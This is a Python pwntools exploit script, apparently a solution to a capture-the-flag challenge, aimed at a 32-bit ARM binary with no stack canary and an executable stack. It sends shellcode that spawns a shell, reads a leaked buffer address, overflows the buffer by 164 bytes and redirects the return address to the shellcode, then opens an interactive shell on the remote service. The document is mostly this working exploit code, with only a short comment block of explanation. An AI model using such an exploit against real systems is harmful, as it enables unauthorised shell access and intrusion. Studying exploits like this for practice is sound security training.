'''
    Arch:       arm-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x10000)
    Stack:      Executable
    RWX:        Has RWX segments

1. determine the appending length of buffer
2. stack overflow to hijack ret address to stack shellcode
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", 26021
filename = "./root_me_stack_buffer_overflow_basic"
elf = ELF(filename)
# context(arch="aarch64", os="linux")
context(arch="arm", os="linux")

if local:
    context.log_level = "debug"
    # io = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", '-g', '6666', filename])
    io = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", filename])
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

buffer_append_len = 164

def pwn():
    payload = asm(shellcraft.arm.linux.sh())
    log.info(f'payload: {payload} | length of payload: {len(payload)}')
    io.sendlineafter(b'Give me data to dump:\n', payload)
    buf_addr = int(io.recvuntil(b':', drop=True), 16)
    log.success(f'buf_addr: {hex(buf_addr)}')
    payload = asm(shellcraft.arm.linux.sh()).ljust(buffer_append_len, b'f')
    payload += p32(buf_addr)
    io.sendlineafter(b'Dump again (y/n):\n', b'y')
    io.sendlineafter(b'Give me data to dump:\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
